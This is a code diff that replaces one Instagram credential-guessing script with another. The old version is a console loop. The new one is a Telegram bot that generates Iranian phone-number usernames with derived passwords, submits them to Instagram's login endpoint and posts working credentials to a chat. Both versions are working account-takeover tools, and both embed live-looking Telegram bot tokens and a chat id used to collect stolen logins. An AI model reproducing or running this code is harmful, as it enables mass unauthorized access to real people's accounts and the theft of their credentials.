@@ -1,62 +1,111 @@
-import requests , random , time , os
-from user_agent import *
-I = ("5497242163")
-T = ("6374462782:AAGp-yeYIAkn9rTSX8auiA6erA2LVp25EAY")
-print('''\n\r
-⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔
-- Hello Man , 
-- The Tool ( Make And Check [ Account Instagram .]) num:num ,
-- You Need ( Token & Id ) ,
-- Programing Tool ( Kabos - @nnkonn ) .
-⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔
+import requests
+import os
+from telebot import types
+import telebot
+from time import sleep
+import random
+from torrequest import TorRequest
+os.system("pip install telebot")
+os.system("pip install pyTelegramBotAPI==3.7.6 ")
+os.system("pip install torrequest ")
 
-''')
-time.sleep(2)
-os.system('clear')
-def checker():
-    while True:
-        time.sleep(2)
-        N = "09876543221"
-        R = ''.join(random.choice(N)for t in range(7))
-        Username = '98912'+R
-        Password = R
-        url = 'https://www.instagram.com/accounts/login/ajax/'
-        headers = {
-        
-        
-        'accept':'*/*',
-        'accept-language':'en-US,en;q=0.9',
-        'content-length':'378',
-        'content-type':'application/x-www-form-urlencoded',
-        'cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
-        'origin':'https://www.instagram.com',
-        'referer':'https://www.instagram.com/',
-        'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
-        'sec-ch-ua-mobile':'?0',
-        'x-asbd-id':'198387',
-        'user-agent': generate_user_agent(),
-        'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
-        'x-ig-app-id':'936619743392459',
-        'x-ig-www-claim':'0',
-        'x-instagram-ajax':'3bcc4d0b0733',
-        'x-requested-with':'XMLHttpRequest',
+os.system("pip install requests ")
+
+os.system("clear")
+
+token = ("5936926762:AAGKjjE9riozRnV7yvMPQaE4UH1MJED-xyg")
+bot = telebot.TeleBot(token)
+r=requests.session() 
+co = types.InlineKeyboardButton(text ="- Start Checker ✅",callback_data = 'check')
+
+#----#
+
+# باعصكم تراكوس :'/
+@bot.message_handler(commands=['start'])
+def start(message):
+    use = message.from_user.username
+    fr = message.from_user.first_name
+    maac = types.InlineKeyboardMarkup()
+    maac.row_width = 2
+    maac.add(co)
+    bjj = message.chat.id
+    bot.send_message(message.chat.id,text=f"""<strong>
+Hi <code>{fr}</code>, 
+- - - - - - - - - - 
+Welcome to Instagram Hunter Bot! 
+Now Click Start Checker! 
+- - - - - - - - - - 
+By  : @trprogram 
+</strong>
+    """,parse_mode='html',reply_to_message_id=message.message_id, reply_markup=maac)
+@bot.callback_query_handler(func=lambda call: True)
+def qwere(call):
+    if call.data == 'check':
+    	log(call.message)
+    if call.data == 'gen':
+        gen(call.message)
+def gen():
+        chars = '1234567890'
+        for user in range(int(100)):
+                    us = str(''.join((random.choice(chars) for i in range(7))))
+                    user = "+98916"+ us
+                    passs = "0916" + us
+                    with open('list.txt', 'a+') as xx:
+                        xx.write(user+':'+passs+'\n')
+                        xx.close()
+def log(message):
+ k = 0
+ f = 0
+ bot.send_message(message.chat.id,f"Now Started!")
+ url = "https://www.instagram.com/accounts/login/ajax/"
+ gen()
+ #by trakos
+ ll = open("list.txt","r").read().splitlines()
+ for l in ll:
+    user = l.split(":")[0]
+    password = l.split(":")[1]
+    
+    headers = {
+            "accept": "*/*",
+            "accept-encoding": "gzip, deflate,br",
+            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
+            "content-length": "475",
+            "content-type": "application/x-www-form-urlencoded",
+            #trakos here
+            "origin": "https://www.instagram.com",
+            "referer": "https://www.instagram.com/",
+            "sec-fetch-dest": "empty",
+            "sec-fetch-site": "same-origin",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
+            "x-csrftoken": "TRjdJzYvTFMREg6fj5rdMcb9MiuSjcs4",
+            "x-ig-app-id": "936619743392459",
+            "x-ig-www-claim": "hmac.AR14QEAb6GaYMOrrb0wjRYN3xSitFGLPN0x8ixWBFzqewQ1K",
+            "x-instagram-ajax": "9f7a9dddd48c",
+            "x-requested-with": "XMLHttpRequest"
         }
-        data = {
-       'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(Password),
-        'username':Username,
-        }
-        respone = requests.post(url,headers=headers,data=data).text
-        if "userId" in respone:            
-            print(f"[-] Successful Account ✅ | Username : {Username} - Password : {Password}")
-            aC = f'''- New Successful Account ✅.
-    ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔
-    ⌔ Phone : {Username}
-    ⌔ Password : {Password}
-    ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ ⌔ 
-    ⌔ Developer : @nnkonn .'''
-            requests.post(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={aC}')
-        else:
-            print(f"[-] Erorr Account ❌ | Username : {Username} - Password : {Password}")
-            
-            
-checker()
+        
+    data = {"username": user, "enc_password": "#PWD_INSTAGRAM_BROWSER:0:1589682409:"+password, "queryParams": "{}",
+                "optIntoOneTap": "false"}
+    login = r.post(url, headers=headers, data=data, allow_redirects=True)
+    if login.text.find("userId") >= 0:
+        print(login.text)
+        f+=1
+        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @trprogram") 
+    elif 'checkpoint_required' in login.text:
+        f+=1
+        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @trprogram")
+    else:
+        print(login.text)
+        k+=1
+        sleep(2)
+        mees = types.InlineKeyboardMarkup(row_width=1)
+        buut = types.InlineKeyboardButton(f"- Error : {k}",callback_data='jhi')
+        buut5 = types.InlineKeyboardButton(f"- On  : {user}:{password}",callback_data='jhi5')
+        buut1 = types.InlineKeyboardButton(f"- Done : {f}",callback_data='jhi1')
+        mees.add(buut,buut1,buut5)
+        bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="**Bot Started ✅**",parse_mode='markdown',reply_markup=mees) 
+        
+
+#داشوفك تريد تخمط
+bot.polling(True)
+                                      
